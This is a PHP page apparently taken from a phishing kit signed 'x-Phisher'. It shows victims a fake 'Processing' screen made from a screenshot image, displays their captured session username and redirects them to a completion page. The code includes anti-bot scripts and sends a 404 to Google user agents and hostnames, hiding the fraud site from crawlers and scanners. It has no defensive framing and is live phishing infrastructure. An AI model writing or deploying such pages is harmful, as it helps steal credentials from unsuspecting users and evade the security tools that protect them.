<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.ru ===========================
*/
session_start();
error_reporting(0);
include('BOTS/antibots1.php');
include('BOTS/antibots2.php');
include('BOTS/antibots3.php');
include('BOTS/antibots4.php');
include ('BOTS/authenticator.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
$_SESSION['u'] = $_SESSION['u'];
?>
<!DOCTYPE html>
<html>
<head>
  <title>Processing</title>
  <META HTTP-EQUIV="refresh" CONTENT="7; URL=done.php">
</head>
<body>
<div>
    <div style="position:absolute;left:0px;top:0px;width:1349px;height:614px;z-index:0;">
        <img src="./files/process_form.jpg">
    </div>
    <p style="left:965px;position:absolute;top:55px;font-size:.845em;"> <?php echo $_SESSION['u']; ?></p>
    <p style="left:1065px;position:absolute;top:69px;font-size:.845em;line-height: 1.2em; margin: 0;"><?php echo date("F j, Y") ?></p>
    <img alt="" style="left:600px;position:absolute;top:345px;" src="./files/loadingAnimation.gif">
 </div>
</body>
</html>